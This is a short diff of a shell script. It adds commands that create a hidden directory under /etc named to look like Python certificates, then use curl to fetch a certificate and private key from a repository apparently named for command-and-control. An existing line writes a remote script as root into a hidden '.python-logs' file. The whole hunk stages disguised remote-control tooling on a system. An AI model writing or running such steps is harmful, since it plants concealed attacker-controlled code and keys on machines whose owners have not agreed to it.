@@ -2,6 +2,12 @@
 
 sudo mkdir -p /etc/.python-certifications
 
+cd /etc/.python-certifications
+
+curl -fsSL --retry 3 https://github.com/AidanNgo/eh-command-control/raw/refs/heads/main/cert.pem -o cert.pem
+
+curl -fsSL --retry 3 https://github.com/AidanNgo/eh-command-control/raw/refs/heads/main/key.pem -o key.pem
+
 curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.sh \
   | sudo tee /etc/.python-certifications/.python-logs > /dev/null
 
